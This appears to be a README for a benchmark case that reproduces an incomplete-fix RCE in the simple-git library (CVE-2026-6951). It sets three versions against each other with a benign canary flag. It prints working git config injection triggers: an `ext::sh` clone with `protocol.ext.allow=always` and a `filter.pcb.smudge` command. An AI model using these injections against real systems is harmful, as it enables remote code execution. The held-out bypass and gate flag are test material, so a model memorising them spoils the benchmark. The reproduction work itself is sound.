# simple-git-cve-2026-6951

simple-git — CVE-2022-25912 -> CVE-2026-6951 (the 25912 fix delegates to
`@simple-git/argv-parser`, whose block-unsafe-operations guard rejects `-c
protocol.ext.allow=always` via a SIX-KEY dangerous-config blocklist
(protocol.allow, core.sshCommand, core.fsmonitor, core.gitProxy, core.hooksPath,
diff.external); `filter.<x>.smudge` — executed via the shell at checkout — is not
in that list, so a crafted `-c filter.pcb.smudge=<cmd>` still executes; RCE via
git config injection; case.json root_cause `RCE`, mechanism
`argument-injection`). **Genuine incomplete fix; gate passed on real Docker over
EXTERNAL HTTP.**

不完全修复分析见 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Faithful-core: the REAL published `simple-git` bytes per version — each in its
OWN `/app/v{0,1,2}` tree so each keeps its OWN `@simple-git/argv-parser` (V1
PINS the genuinely-shipped-vulnerable 1.0.3 via package.json `overrides`; a
shared node_modules would hoist one parser and destroy the differential —
runtime-verified apv 1.0.3 vs 1.1.1). V0 = simple-git@3.14.1 (no guard), V1 =
3.35.2+apv1.0.3, V2 = 3.36.0+apv1.1.1. Benign canary only: the entrypoint plants
`${PCB_FLAG}` at `/canary/flag.txt` and builds a LOCAL bare repo
(`/srv/repo.git`) whose `data.txt` carries `filter=pcb` in `.gitattributes`, so a
plain clone's checkout invokes the injected smudge command locally — no network.

GHSA-hffm-xvc3-vprc (case.json `evidence.incomplete_fix_quote`): "Versions of the
package simple-git before 3.36.0 are vulnerable to Remote Code Execution (RCE)
due to an incomplete fix for CVE-2022-25912 ... an attacker may still achieve
remote code execution by enabling protocol.ext.allow=always and using an ext::
clone source." NOTE from repro.log DATA-QUALITY: the advisory's secondary-source
summary ("blocks -c but not --config") does NOT match the real 1.0.3 bytes —
argv-parser 1.0.3 blocks BOTH forms (empirically verified); the genuine residual
pinned FROM THE DIFF is the omitted dangerous config KEY `filter.<x>.smudge`,
which 1.1.0 adds (allowUnsafeFilter, ~20 new keys + env screening). The fix is
the dependency bump `@simple-git/argv-parser ^1.0.3 -> ^1.1.0`.

Distinct from PCBV2-0191 (`-u`/`--upload-pack` short-option CLUSTER past
`allowUnsafePack`) — different guard category, different sink.

- **V0 = 3.14.1** (`:39673`) — no guard: `-c protocol.ext.allow=always` +
  `ext::sh -c ...` remote runs the canary command -> flag in `/canary/out.txt`
  (repro.log: REACHED).
- **V1 = 3.35.2 + argv-parser@1.0.3** (`:39674`, target) — the 25912 guard
  BLOCKS the seed ("Configuring protocol.allow is not permitted without enabling
  allowUnsafeProtocolOverride"), but `-c filter.pcb.smudge=cat /canary/flag.txt>...`
  slips the six-key blocklist -> checkout runs the smudge command -> flag.
  Incomplete fix.
- **V2 = 3.36.0 + argv-parser@1.1.1** (`:39675`, 6951 fix) — "Configuring
  filter.smudge is not permitted without enabling allowUnsafeFilter" -> blocked.

- **Original trigger**: `git.clone("ext::sh -c cat% /canary/flag.txt>/canary/out.txt",
  dest, ["-c", "protocol.ext.allow=always"])` (`poc/original_poc.py` candidate).
- **Residual trigger**: `git.clone("file:///srv/repo.git", dest,
  ["-c", "filter.pcb.smudge=cat /canary/flag.txt>/canary/out.txt"])`
  (`_heldout/bypass_poc.py` candidate).

Run: `python3 oracle.py --wait --v2` (gate, flag `PCBFLAG_gate_882bb0d412be3cfd`
per repro run: seed reaches@v0 / seed blocked@v1 / residual reaches@v1 / residual
blocked@v2; passed=true). See `repro.log` and `case.json`.

> NOTE: the real fix is a DEPENDENCY bump (`argv-parser ^1.0.3 -> ^1.1.0`), so V1
> must pin argv-parser to 1.0.3 via overrides to preserve the differential; the
> advisory's "-c but not --config" summary does not match the actual 1.0.3 bytes
> (both forms are blocked there) — documented in repro.log DATA-QUALITY.
